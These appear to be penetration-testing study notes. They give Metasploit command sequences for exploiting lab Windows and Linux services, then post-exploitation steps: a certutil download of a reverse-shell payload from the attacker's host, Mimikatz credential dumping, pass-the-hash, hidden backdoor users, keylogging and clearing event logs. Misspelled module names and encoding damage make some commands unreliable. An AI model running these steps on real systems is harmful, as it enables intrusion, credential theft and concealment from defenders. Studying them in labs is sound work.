  

### _==**Windows Exploitation**==_

when u exploit a windows server and get a meterpreter session , u can get a screenshots , video records , webcam recored , just type `help` on the materpreter session

> ==_AUTHORITY\LOCAL SYSTEM_== â‡’ when u exploit somthing and have a highest privs on system

> ==AUTHORITY\LOCAL SERVICE== â‡’ that when u exploit a service , so u have a highest privs related to this process just

  

- ==Exploiting A Vulnerable HTTP File Server==

> HTTP FILE SERVER : is a web server that is designed for file & document sharing . ( itâ€™s host for document and file to share and download )

> typically on port 80

> the difference between a http server and http file server is the http file server u designed it just to host file u want to share with users .

> example of http file server is â‡’ `Rejetto HFS`

- ==Exploiting HTTP File Server==
    
    - `nmap -sV -O -sS <ip>` â‡’ to do some port scan to identify the **_==Rejetto Hfs 2.3==_**
    - `service postgresql start`
    - `msfconsole` && `workspace -a HFS` && `setg RHOST <target ip>`
    - `search type:exploit name:regetto` && `use exploit/windows/http/rejetto_hfs_exec`
    - `run` â‡’ we can see the meterpreta session is open and we gain access to the server , we can modify the payload to x64 â‡’ `set payload windows/x64/meterpreter/reverce_tcp`
    - `shell` && `cd c://` && `type flag.txt`
    
      
    

  

- ==Exploiting Windows MS17-010 SMB Vulnerability==

> ==EternalBlue(MS17-010)== â‡’ is collection of windows vulnerabilities and exploits that allow attackers to remotely execution code and gain access to windows system

> on SMBv1 Protocol

- ==Exploit EternalBlue(MS17-010)==
    
    - `nmap -sS -sV -O <target ip >` â‡’ to do some port scanning and identify the smb
    - `service postgresql start`
    - `msfconsole` && `workspace -a Blue`
    - `search type:auxiliary name:eternalblue`
    - `use auxiliary/scanner/smb/smb_ms17_010`
    - `set rhost <target ip>` && `run`
    - `search type:exploit name:eternalblue` && `use exploit/windows/smb/ms17_010_eternalblue`
    - `set rhost <target ip>` && `set payload windows/x64/meterpreter/reverce_tcp` && `run`
    
      
    

  

- ==Exploiting WinRM (Windows Remote Management Protocol)==

> _==Windows Remote Management (WinRM)==_ â‡’ is a Protocol that can be used to facilitate remote access with windows system . `u can understand and act with it as the SSH Protocol`

> WinRM used to â‡’ ==remote access and interact with windows hosts on local network== && ==remote access and execute commands on windows system== && ==manage and configuration windows system remotely==

> Typically on port 5985 and 5986

- ==Exploiting WinRM==
    
    - `nmap -sS -sV -O <target ip>` â‡’ to do some scanning port to identify WinRM protocol
    - `service postgresql start` && `msfconsole` && `workspace -a WinRM`
    - `search type:auxiliary name:WinRm` && `use auxiliary/scanner/winrm/winrm_auth_methods`
    - `set rhost <target ip >` && `run`
    
    > Here we will know the authentication method that is used , to identify if we can do a brute force attack on it
    
    - `search winrm_login` && `use auxiliary/scanner/winrm/winrm_login`
    - `set rhost <target ip >` && `set pass_file /usr/share/metasploitâ€¦/data/wordlists/unix_password.txt` && `set user_file /usr/share/metasploitâ€¦/data/wordlists/common_user.txt`
    
    > after we get the username and password
    
    - `search winrm_cmd` && `use auxiliary/scanner/winrm/winrm_cmd`
    - `set username < >` && `set password < >` && `run`
    - `set cmd < command u want to run >`
    - `use exploit/windows/winrm_script_exec` && `set username < >` && `set password < >` && `set rhost <target ip >` && `set force_vbs true`
    
      
    
      
    

  

- ==Exploiting A Vulnerable Apache Tomcat Web Server==

> _Apache Tomcat or tomcat server_ is a popular , free and open source java servlet web server

> Is used to build and host dynamic website and web application based on java platform software

> on port 8080

> The standard Apache Http web server used to host website , ==typically developed in PHP== . on ==port 80==

> ==The apache tomcat developed in JAVA== , on ==port 8080==

> Apache Tomcat V8 to lower version is vuln to RCE on JSP(Java service page)

  

- ==Exploit Apache Tomcat==
    
    - `nmap -sV -sS -O <target ip >` â‡’ to do some port scanning to identify a apache tomcat server
    - `service postgresql start` && `msfconsole` && `workspace -a Tomcat`
    - `search type:exploit name:tomcat` && `use exploit/multi/http/tomcat_jsp_upload_bypass`
    - `set rhost <target ip>` && `set payload java/jsp_shell_bind_tcp` && `set shell cmd` && `run`
    
    > ==that will upload a jsp script (java service page ) to the server , and with the payload we entered so will get a java jsp shell on the target , and becuase we have a windows target we will enter the shell as a cmd==
    
    > we will get a command promet on the target
    
    - so if we want to get a meterpreter session , we need to generate a payload with msfvenom then upload it throgh jsp
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<our ip> LPORT=1234 -f exe >meterpreter.exe`
    - `python3 -m server.http 80` && on windows jsp shell session â‡’ `certutil -urlcache -f http://<our ip>/meterpreter.exe metepreter.exe`
    
    > that will upload the payload on the target system
    
    - `use multi/handler` && `set payload windows/meterpreter/reverse_tcp` && `set lhost <our ip>` && `set lport 1234` && `run`
    - on jsp shell session on target system â‡’ `./meterpreter.exe`
    - we will get a meterpreter session on the target not just a jsp shell
    

  

  

  

### _==**Linux Exploitation**==_

  

- **_==Exploiting A Vulnerable FTP Server==_**

> FTP ( File transfer protocol ) on 21 , used to for file sharing between a server and client/clients .

> used to transfer file ==to && from== directory of a web server

> vsftpd is an FTP server for Unix-kali system , Vsftpd V2.3.4 is vulnerable to rce

- **_==Exploiting FTP==_**
    
    - `nmap -sS -sV -O <TARGET IP>` â‡’ to do some port scan to identify the ftp server
    
    > `u can do that by using mfsconsole` && `db_nmap`
    
    - `service postgrsql start` && `mfsconsole` && `workspace -a ftp`
    - `search vsftpd` && `use exploit/unix/ftp/vsftpd_234_backdoor`
    - `set Rhost <target ip>` && `run`
    
    > when we run that a malicious backdoor that was added to the vsftpd download archive
    
    - if we want to open bash terminal â‡’ `/bin/bash -i`
    
    ðŸ’¡
    
    now we have a shell session on target if we want to upgrade that to meterpreter session
    
    - `search sell_to_meterpreter` && `use post/multi/manage/shell_to_meterpreter`
    
    > _the post exploit from shell to meterpreter required us to have active session on target system â‡’ we have from the vsftpd exploit_
    
    - `set lhost <our ip or the name of intrface>` && `set port 1234` && `set session 1< the target active session` `_number_` `>` && `run`
    - `sessions <number of session u want>` â‡’ we can see we have 2 sessions , shell and meterpreter
    
      
    

  

> `crtl + z` â‡’ ==_to put session on background_==

  

- **_==Exploiting Samba==_**

> ==_itâ€™s a linux version of SMB , on port 445 , ran on top of NetBios using port 139_==

> Samba V3.5.0 is vulnerable to rce

- ==Exploit samba==
    
    - `nmap -sS -sV -O <TARGET IP>` â‡’ to do some port scan to identify the samba server
    
    > `u can do that by using mfsconsole` && `db_nmap`
    
    - `service postgrsql start` && `mfsconsole` && `workspace -a ftp`
    - `search type:exploit name:samba` && `use exploit/linux/samba/is_known_pipename`
    - `check` â‡’ to check if this version of samba vuln or not
    - `set rhost <target- ip>` && `run`
    
    ðŸ’¡
    
    now we have a shell session on target if we want to upgrade that to meterpreter session
    
    - `crtl + z` â‡’ to put session on background && `use post/multi/manage/shell_to_meterpreter`
    - `set lhost <our ip >` && `set lport 1234` && `set session <number of the session >`
    
      
    

  

- **_==Exploiting A Vulnerable SSH Server==_**

> SSH (secure shell ) is a remote administrater protocole that offers encryption and is the successor to telnet

> on port 22 , used to remote access to servers and system

> libssh multiplatform c library implementing the SSHV2 protocole on client and server side , libssh V0.6.0-0.8.0 is vuln to authentication bypass .

- ==Exploit SSH==
    
    - `nmap -sS -sV -O <TARGET IP>` â‡’ to do some port scan to identify the SSH server
    
    > `u can do that by using mfsconsole` && `db_nmap`
    
    - `service postgrsql start` && `mfsconsole` && `workspace -a libSSH`
    - `search libssh_auth_bypass` && `use auxiliary/scanner/ssh/libssh_auth_bypass`
    - `set rhost <target ip>` && `set spawn_pty true` && `run`
    
    > used to spawn a TTY session on the target system
    
    ðŸ’¡
    
    now we have a shell session on target if we want to upgrade that to meterpreter session
    
    - `crtl + z` â‡’ to put session on background && `use post/multi/manage/shell_to_meterpreter`
    - `set lhost <our ip >` && `set lport 1234` && `set session <number of the session >`
    

  

- **_==Exploiting A Vulnerable SMTP Server==_**

> SMTP ( simple mail transfer protocole ) is communication protocole tht is used for the transmission of email

> on port 25 , or on port 465 and 587

> Haraka is smtp server developed in node.js , it come with plugin of proccessing attachments , haraka versions prior to V2.8.9 are vuln to command injection.

- ==Exploit SMTP==
    
    - `nmap -sS -sV -O <TARGET IP>` â‡’ to do some port scan to identify the smtp server
    - `u can do that by using mfsconsole` && `db_nmap`
    - `service postgrsql start` && `mfsconsole` && `workspace -a haraka`
    - `search type:exploit name:haraka` && `use exploit/linux/smtp/haraka`
    - `set rhost <target ip>` && `set srvport 9898` &&`set email_to root@attackdef.test` && `set payload linux/x64/meterpreter_reverse_http (non-staged payload )` && `set lhost <our ip>` && `run`
    

  

  

  

### ==**Post Exploitation Fundamentals**==

  

- ==**_Meterpreter Fundamentals_**==

> ==Meterpreter ( Meta-Interpreter )== payload is an advanced multi-functional payload that operates via DLL injection and is executed in memory on the target system , consequently making it difficult to detect .

> The payload is always executed in memory not on the disk , becuase that it is difficult to detect

- ==**_Meterpreter Fundamentals_**==
    
    - `nmap -sS -sV -O <TARGET IP>` â‡’ to do some port scan to identify the open ports
    
    > `u can do that by using mfsconsole` && `db_nmap`
    
    - `service postgrsql start` && `mfsconsole` && `workspace -a meterpreter`
    - now see what u have on open port , explore the ports and try to identify some exploitation of thats services .
    - After Find exploit of services , now try exploit it and get meterpreter session to take control of target system .
    - `help` â‡’ to see all command u can use on the meterpreter session .
    - `sessions -C <command u want> -i <session number>` â‡’ to intract with a sessions without open it while it in background
    - `session -k <number of the session >` â‡’ to kill the seesion
    - `download <name of file >` â‡’ to download file from target system to our system
    - `upload <name of file > <path u want >` â‡’ to upload file on the target system from our system
    - `checksum md5 <path>` â‡’ to get the md5 hash of particular binary
    - `search <file name >` â‡’ to search for file on the target system
    - `search -d <path> -f *``_<name>_``*` â‡’ to search for file on specific path and with a specific name
    - `search -f *.<file extensions>` â‡’ to search with specific file extensions
    - `shell` â‡’ to turn the meterpreter to shell || `bin/bash -i` â‡’ to get native shell session
    - `ctrl + c` â‡’ to kill the channel of the shell session
    
      
    
      
    
      
    
      
    

  

  

- **_==Upgrading Command Shells To Meterpreter Shells==_**

> We have 2 way to upgrad our command shell 2 meterpreter

> In some exploits we will get a shell just , bun in this case we want a meterpreter session , becuase itâ€™s more useful

- ==**_Upgrading Command Shells To Meterpreter Shells_**==
    
    - `ctrl + z` â‡’ to put the shell session on background
    - `search shell_to_meterpreter` && `use post/multi/manage/shell_to_meterpreter`
    - `set lhost <our ip>` && `set lport 1234` && `set session <the number of shell session >` && `run`
    
    ðŸ’¡
    
    we can automate that using
    
    - `sessions -u <number of shell session >`
    

  

  

### ==_**Windows Post Exploitation**_==

  

- ==Windows Post Exploitation Modules==

> Some Example â‡’ enum user privileigs , enum logged on user , vm check ,enum AVs ,enum installed program , enum computer connected to admin â€¦etc

- _==Windows Post Exploitation Modules==_
    
    - `service postgresql start` && `msfconsole`
    - `db_nmap -sS -sV -O <target ip >`
    - `loot` â‡’ to see the path of all info u extracted from post modules
    
    ðŸ’¡
    
    After we find the services running and then exploit it
    
    - `show_mount` â‡’ to see what a drives the target system have .
    - `ps` â‡’ to see the proccess tree
    - `search win_privs` && `use post/windows/gather/win_privs` â‡’ to enum the privilages we have on target system
        
        - `set session <number of session>` && `run`
        
          
        
    - `search enum_logged_on` && `use post/windows/gather/enum_logged_on` â‡’ to see who is logged on on this target system
        
        - `set session <number of session>` && `run`
        
          
        
    - `search checkvm` && `use post/windows/gather/checkvm` â‡’ to check if the target system on vm or not
        - `set session <number of session>` && `run`
    
      
    
    - `search enum_applications` && `use post/windows/gather/enum_applications` â‡’ to see what programs installed on the target
        
        - `set session <number of session>` && `run`
        
          
        
    - `search enum_av` && `use post/windows/gather/enum_av_excluded` â‡’ to identify what av are intalled and what dir being scanned by the av and what file exten will be scanned
        - `set session <number of session>` && `run`
    
      
    
    - `search enum_computers` && `use post/windows/gather/enum_computers` â‡’ to identify if target computers are part of admin zone or not
        
        - `set session <number of session>` && `run`
        
          
        
    - `search enum_patches` && `use post/windows/gather/enum_patches` â‡’ to enum the applied patches modules on target
        - `set session <number of session>` && `run`
    
      
    
    - `search enum_shares` && `use post/windows/gather/enum_shares` â‡’ to enum what shres the target have
        - `set session <number of session>` && `run`
    

  

- ==Windows Privilege Escalation: Bypassing UAC==

> ==User Account Control ( UAC )== â‡’ is a security windows feature , used to prevent unauthorized changes from being made

[https://th.bing.com/th/id/OIP.tZGl8-hazULJRMFpua687QAAAA?w=214&h=171&c=7&r=0&o=5&dpr=1.5&pid=1.7](https://th.bing.com/th/id/OIP.tZGl8-hazULJRMFpua687QAAAA?w=214&h=171&c=7&r=0&o=5&dpr=1.5&pid=1.7)

> if u are a basic user , when u hit yes then the system will ask for an admin password to processed your request .

> ==_To do that we need a x64 meterpreter payload_==

- ==_Exploit UAC_==
    
    - AFTER we exploit a service and get a meterpreter session , if we see that we have just a admin privs , and we need to Escalat our privs , we can see if we try to execute some command need a administrater privis we will get a massage â€œaccess denied â€œ
    - `getprivis` â‡’ to see our privis && `shell` && `net user` â‡’ to get the user on system && `net localgroup administrater` â‡’ to see if we are part of administarter zone ( this a imp step , if we are part we can bypass the uac and get what we want
    - `search bypassuac` && `use exploit/windows/local/bypassuasc_injection`
    - `set payload windows/x64/meterpreter/reverse_tcp` && `set session <session number>` && `set lhost` && `set lport 1234` && `set target windows\x64` && `run` â‡’ ==_so here we will bypass the UAC by inject our payload to a process in memory , so that will make another meterpreter session to us but in the newest session the UAS flag will be a false ( UAC disabled )_==
    
      
    
      
    

  

  

- ==_Windows Privilege Escalation:Token Impersonation With Incognito_==

> windows access tokens â‡’ is acore element of the authentication proccess on windows are created and managed by the local security authority subsystem services ( LSASS ) .

> The purpose of using windows access tokens is to reduce the number of process of entering the user of his password to identify his access to his account

> Example of that , if the windows access token dose not exisit , we should enter the username and password each time we want to login , then we need to enter it again when we want to open any program on system

- _==Exploit Privilege Escalation:Token Impersonation With Incognito==_
    
    - after we exploit on meterpreter session
    - `getprivs` â‡’ to see our privis , ==_if we see one of this privis is SeImpersonatePrivilege_==
    - `load incognito` && `list_tokens -u` â‡’ we will see we have to type of tokens delegation (active) and Impersonation (unactive)
    - so on delegation we can see the administrator token , so copy it ,then â‡’ `impersonate_token â€œ<administrator token >â€`
    
    > That will imersonate our token from a basic user to administrator token , then we will be a administator
    
      
    

  

  

- ==Dumping Hashes With Mimikatz==

- _Dumping Hashes With Mimikatz_
    
    - `load kiwi` && `help`
    - `creds_all` â‡’ to retrieve all credentials
    - `lsa_dump_sam` â‡’ dump lsa sam database
    - `lsa_dump_secrets` â‡’ :(
    - `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe` && `shell` && `./mimikatz.exe`
    - `sekurlsa::logonpassword` â‡’ to dump all paswword
    
      
    
      
    

  

  

- ==Pass-the-Hash With PSExec==

> ==pass_the_hash attack== â‡’ is an exploitation techinique that involves capturing or harvesting NTLM hashes or clear passwords and utilizing them to authenticate with target legitimately .

> u can use PsExec moudule to authenticate with the target system via SMB

- ==Exploit Pass_the_Hash==
    
    - after u get the NTLM hashes using kiwi
    - `search psexec` && `use exploit/windows/smb/psexec`
    - `set payload windows/x64/meterpreter/reverse_tcp` â‡’ if the target is 64 bit && `set rhost <target ip>` && `set SMBuser Administrator` && `set smbpass <administrator hash >` && `set lhost` && `set lport` && `run`
    
      
    

  

- ==Establishing Persistence On Windows==

> persistence consists of techniques that adversaries use to keep access to system acreoss restart,changed credentials

> Thatâ€™s mean that when we gain access to the target system , we will keep our hand on it , even if the target system restart , The credentials changed and so on .

> _So here we want to creat || setting up a persistent service on the target system that will constantly be running , thatâ€™s mean if we lose our meterpreter session we can get it back ._

- _==Establishing Persistence On Windows==_
    
    - After we Exploit the service we want , and get a meterpreter session ( we need a administrater access to the target system )
    - `search type:post name:persistence` && `use exploit/windows/peristence_service`
    - `set payload windows/meterpreter/reverse_tcp` && `set session < number of session >` && `run` && #==`set service_name < u can write a name of the service to be more realistice`==
    
    ðŸ’¡
    
    Now to get the conniction back to our hand
    
    - use multi/handler && set payload `windows/meterpreter/reverse_tcp( As the one on the peristence exploit)` && `set lhost` && `set lport` && `run`
    - now we will get the peristence meterpreter session again .
    
      
    
      
    

  

- **==_Enabling RDP_==**

> remote desktop protocol : is a GUI remote access protocol , used to remotly connect and interact with a windows system . on port 3389 , is default disabled

- ==_Enabling RDP_==
    
    - After we Exploit the service we want , and get a meterpreter session ( we need a administrater access to the target system )
    - `search enable_rdp` && `use post/windows/manage/enaable_rdp`
    - `set session <number of session >` && `==# u can create a new user set username && set password==`
    
    ðŸ’¡
    
    Now if we want to just a hack the system , we can change the password of the administrator , to open the rdp , or we can creat a new user
    
    - to change password â‡’ `net user administrator hacker123`
    - `to open rdp and login â‡’ xfreerdp /u:administrator /p:<password > /v:<target ip>`
    
      
    
      
    

  

- **==_Windows Keylogging_==**

> Is the proccess of recording or capturing the keystrokes entered on a target system

- **==_Windows Keylogging_==**
    
    - After we Exploit the service we want , and get a meterpreter session ( we need a administrater access to the target system )
    - `pgrep < name of proccess>` && `migrate <the number of proccess that return from pgrp >`
    - `pgrep explorer` && `migrate 2312`
    
    > Meterpreter provide us with the ability to start and stop caputer and dump all key on buffer
    
    - `keyscan_start` â‡’ so then evert text input by keybored on browser or textediter or powershill ..etc , will captured
    - `keyscan_stop` â‡’ to stop the captureing
    - `keyscan_dump` â‡’ that will dump capturing key on buffer .
    
      
    
      
    

  

- **==_Clearing Windows Event Logs_==**

> Windows OS Stores and catalogs all actions/events performed on the system and stores them in the windows Event Log .

> Event logs are categorized based on the type of events to â‡’ 1 - applicatios logs â‡’ stores application logs like â€¦ startup,crashes..etc. 2- system logs â‡’ store event like â€¦.. startup , rebootes . 3- security logs â‡’ store security events like â€¦.. password changes , authentication failures

> Events logs can be accessed via the event viewer on windows

- **==_Clearing Windows Event Logs_==**
    
    - After we Exploit the service we want , and get a meterpreter session ( ==_we need a administrater access to the target system_== )
    - so as a example we changed the administrator password to another one , On the event Viewer that will diplayed
    - To clear it just â‡’ `clearev` .
    
    > Thatâ€™s will remove all event logs
    
    - then the seconed imp step is to clear the file u exploit the target with
    

  

  

- ==_**Pivoting**_==

> Is a Post Exploitation techniqu that involves utilizing a compromised host to attack other system on the compromised hostâ€™s private internal network .

> So the idea here After gaining access to one host ,we can use the compromised host to exploit other host on the same internal network to which we could not access previously . ( when u gain access to some computer on copmany , the Pivting here is we can gain access to another hosts of company on the internal network )

  

- ==_**Pivoting**_==
    
    > let say we have 2 ip for 2 victom machine , the first ip when u perform a ping for it , it will reponse , but the seconed did not response , but the seconed ip is part of the first ip domain , the 2 ip in same local network
    
    - **==_After we exploit the first ip which we can do a ping for it_==**
    - After we get a meterpreter session , type `ipconfig` , we need to identify if the seconed ip is part of the subnet of ip 1 , if the first and second ip is have same subnet , we can Pivoting
    - `run autoroute -s <` ==`_<>.<>.<>.0_`== `>/20` â‡’ so now we let msfconsole to access this subnet and add route to the msfconsole , so we added this subnet range to msfconsole .
    
    > we cant do nmap on the rout , the rout just applicable to metasploit modules .
    
    - `so now with a portscanner auxiliry moduls , scan open port of the seconed ip`
    - then in metepreter session , `portfwd add -l 123 -p 80 -r <seconed ip (local network ip)>`
    
    > so here we forward the port 80 which is open on the seconed ip , to 123 , Then we forward the seconed ip to [localhost](http://localhost)
    
    - `db_nmap -sS -sV -p 123` `[localhost](http://localhost)` â‡’ ==so here we do a nmap to the seconed ip , we remember we forwarding the port 80 to 123 â‡’ these just to identify what services running on the seconed ip==
    
    > if we search of our local host we will see the actule seconed ip intrface
    
    - now search for this services and exploited it
    
      
    
      
    
      
    
      
    
      
    
      
    

  

### ==_**Linux Post Exploitation**_==

  

- _==Linux Post Exploitation Modules==_
    
    > _==we will use the linux post exploitation modules to do some enum like==_ â‡’ enum system configuration , enum environmaent variables , enum network configration , VM Check , enum user history .
    
      
    
    - _==Linux Post Exploitation Modules==_
        
        - `service postgersql start` && `msfconsole` && `workspace -a linux_mod` ==_( to easy search for evrey yhing using loot )_==
        - `db_nmap -sS -sV -O <targrt ip >` â‡’ to do some port scanning ti identify what services are running
        - After we exploit the services and get a meterpreter session
        - `ps aux` â‡’ to list the running process
        
          
        
          
        
        - `search enum_configs` && `use post/linux/gather/enum_configs` â‡’ to get all linux target configration file
            - `set session <session number >`
        
          
        
        - `search env platform:linux` && `use post/multi/gather/env` â‡’ to get all system environment settings || environment variables
            - `set session <session number>`
        
          
        
        - `search enum_network` && `use post/linux/gather/enum_network` â‡’ to enum or gather network information
            - `set session <session number>`
        
          
        
        - `search enum_protections` && `use post/linux/gather/enum_protections` â‡’ to identify the system security protaction or to identify any security features or modules that may have been enabled , like ==( smep ,smap , selinux , pax â€¦etc )== * notes*
            - `set session <session number >`
        
          
        
        - `search enum_system` && `use post/linux/gather/enum_system` â‡’ gathering system and user information
            - `set session <session number >`
        
          
        
        - `search checkcontainer` && `use post/linux/gather/checkcontainer` â‡’ to check if the target system linux is on container or not
            
            - `set session <session number >`
            
              
            
        - `search checkvm` && `use post/linux/gather/checkvm` â‡’ to check if the target system linux is on vertual machine or not
            
            - `set session <session number >`
            
              
            
        - `search enum_user_history` && `use post/linux/gather/enum_user_history` â‡’ to gathering the user history for all the user accounts on the system (command history || log ).
            - `set session <session number >`
        
    
      
    

  

- ==_Linux Privilege Escalation: Exploiting A Vulnerable Program_==

> privilege escalation on linux depend on the version of the linux kernal running on target system as well as the distribution release version .

- ==_Linux Privilege Escalation: Exploiting A Vulnerable Program_==
    
    - `service postgersql start` && `msfconsole` && `workspace -a linux_mod` ==_( to easy search for evrey yhing using loot )_==
    - `db_nmap -sS -sV -O <targrt ip >` â‡’ to do some port scanning ti identify what services are running
    - After we exploit the services and get a meterpreter session
    - if wwe have a shell session â‡’ `session -u <session number >` (to upgrade it to meterpreter session )
    - `cat /etc/*issuse` â‡’ to see the version of linux kernal and the env version
    
    > ==now we want to list all process on system to try identify any proccess or script related to root==
    
    - `ps aux` â‡’ to list process
    - ==_as example_== we found a bash script related to root â‡’ `cat /bin/chkrootit/check-dump`
    
    > so the script have a while loop , to execute ==_chkrootkit evrey 60 seconed_==
    
    - `chkrootkit -v` â‡’ version (0.49) which is vuln to priv esclaction
    - `ctrl + z` && `search chkrootkit` && `use exploit/unix/local/chkrootkit`
    - `set chkrootkit <path of script file (/bin/chkrootit/) >` && `set session <session number>` && `set lhost` && `set lport` && `run`
    
    > ==_that will creat a cron jobs and run chkrootkit via cron to get a privs escla_==
    
    - `/bin/bash -i` â‡’ we will see that we get a privis esclat
    
      
    
      
    

  

  

- ==_Dumping Hashes With Hashdump_==

> hashdump module can dump the hashs on /etc/shadow , and unshadow the hashes for password cracking using john the ripper

- ==_Dumping Hashes With Hashdump_==
    
    - `service postgersql start` && `msfconsole` && `workspace -a linux_mod` ==_( to easy search for evrey yhing using loot )_==
    - `db_nmap -sS -sV -O <targrt ip >` â‡’ to do some port scanning ti identify what services are running
    - After we exploit the services and get a meterpreter session we need root
    - if wwe have a shell session â‡’ `session -u <session number >` (to upgrade it to meterpreter session )
    - `search hashdump` && `use post/linux/gather/hashdump`
        - `set session <session number >` && `run`
    - `loot` && `see the files`
    

  

- ==_Establishing Persistence On Linux_==

> As we know the persistence help us to keep access to the system even if the system restart , changed password â€¦.etc

- ==_Establishing Persistence On Linux_==
    
    - `service postgersql start` && `msfconsole` && `workspace -a linux_mod` ==_( to easy search for evrey yhing using loot )_==
    - `db_nmap -sS -sV -O <targrt ip >` â‡’ to do some port scanning ti identify what services are running
    - After we exploit the services and get a meterpreter session ==_we need root_==
    - if wwe have a shell session â‡’ `session -u <session number >` (to upgrade it to meterpreter session )
    
    > this will be work just if we have a ssh or remote access control
    
    - so we will creat a background user and provide it with a default name to avoid detected
    - `useradd -m <name (ftp)> -s /<path (/usr/sbin/nologin)> /bin/bash` && `password ftp <any password>`
    
    > after we creat account we need to provide it with the highes privs , so first make sure the account on the same group with root
    
    - `usermod -aG root ftp`
    - `usermod -u 15 ftp` â‡’ to make the account like is created from past time
    
    > we can used a modules to do that
    
    - `search platform:linux persistence` && `use post/linux/manage/sshkey_persistence`
        
        - `set session <session number>`
        - `set creatsshfolder true` && `run`
        - ==see the privit key text file and copy it==
        - vim ssh_key â‡’ and peast it && chmod 0400 ssh_key
        - `ssh -i <file thatâ€™s contain the privite key > <username>@<ip>` â‡’ to login in any user on the system
        
        > ==thatâ€™s the perfect one becuase this will creat a public and privet ssh key and added it to all home dir of all users .==